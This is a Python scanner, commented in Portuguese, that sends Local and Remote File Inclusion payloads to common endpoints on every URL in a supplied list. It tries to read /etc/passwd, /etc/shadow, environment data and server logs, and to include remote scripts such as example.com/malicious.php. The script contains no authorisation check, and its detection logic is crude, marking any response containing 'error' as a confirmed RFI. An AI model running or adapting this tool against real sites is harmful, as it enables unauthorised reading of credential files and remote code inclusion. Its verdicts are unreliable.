import requests

# Cores para terminal
class Colors:
    GREEN = '\033[92m'  # Verde
    RED = '\033[91m'    # Vermelho
    YELLOW = '\033[93m'  # Amarelo
    RESET = '\033[0m'   # Resetar cor

# Payloads comuns para LFI e RFI
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../proc/self/environ",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../../var/www/html/index.php",  # Exemplo de arquivo da aplicação
    "/etc/hosts",
    "/etc/hostname",
    "/etc/services",
    "/proc/version",
    "/proc/cpuinfo"
]

RFI_PAYLOADS = [
    "http://example.com/malicious.txt",
    "https://example.com/malicious.php",
    "http://localhost:8000/malicious.php",  # Para testes locais
    "http://example.com/../../../../malicious.txt",  # Tentativa de ataque
]

# Endpoints comuns para testar LFI/RFI
COMMON_ENDPOINTS = [
    "/index.php?file=",
    "/page.php?page=",
    "/include.php?file=",
    "/load.php?src=",
    "/view.php?id=",
]

# Funções de verificação
def test_lfi(url, payload):
    try:
        response = requests.get(url + payload, timeout=5)
        if response.status_code in {200, 500}:  # Considera resposta 200 e 500
            # Verificações mais específicas para detectar LFI
            if ("root:" in response.text or "user:" in response.text or "password:" in response.text):
                return f"{Colors.GREEN}[+] Vulnerabilidade LFI encontrada em {url + payload}{Colors.RESET}"
            elif "No such file" not in response.text and "error" not in response.text:  # Evitar erros comuns
                return f"{Colors.YELLOW}[-] Possível LFI em {url + payload} (mas sem confirmação clara){Colors.RESET}"
    except requests.RequestException as e:
        return f"{Colors.RED}[!] Erro ao acessar {url + payload}: {e}{Colors.RESET}"

def test_rfi(url, payload):
    try:
        response = requests.get(url + payload, timeout=5)
        if response.status_code == 200:
            # Análise mais cuidadosa para verificar RFI
            if "malicious" in response.text or "error" in response.text:
                return f"{Colors.GREEN}[+] Vulnerabilidade RFI encontrada em {url + payload}{Colors.RESET}"
            else:
                return f"{Colors.YELLOW}[-] Possível RFI em {url + payload} (mas sem confirmação clara){Colors.RESET}"
    except requests.RequestException as e:
        return f"{Colors.RED}[!] Erro ao acessar {url + payload}: {e}{Colors.RESET}"

def check_url(url):
    results = []

    # Testa para LFI
    for payload in LFI_PAYLOADS:
        result = test_lfi(url, payload)
        if result:
            results.append(result)

    # Testa para RFI
    for payload in RFI_PAYLOADS:
        result = test_rfi(url, payload)
        if result:
            results.append(result)

    return results

def main(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        print(f"{Colors.RED}[Erro] Arquivo não encontrado: {file_path}. Verifique o caminho e tente novamente.{Colors.RESET}")
        return

    print(f"Iniciando verificação de LFI e RFI nas URLs do arquivo: {file_path}\n")
    
    # Resumo de vulnerabilidades encontradas
    total_vulnerabilities = 0

    for url in urls:
        print(f"Verificando URL: {url}")
        
        # Testa endpoints comuns
        for endpoint in COMMON_ENDPOINTS:
            full_url = url + endpoint
            
            # Testa para LFI e RFI
            results = check_url(full_url)
            for result in results:
                print(result)
                total_vulnerabilities += 1

    print(f"\nVerificação concluída. Total de vulnerabilidades encontradas: {total_vulnerabilities}")

if __name__ == "__main__":
    file_path = input("URls File: ")
    main(file_path)
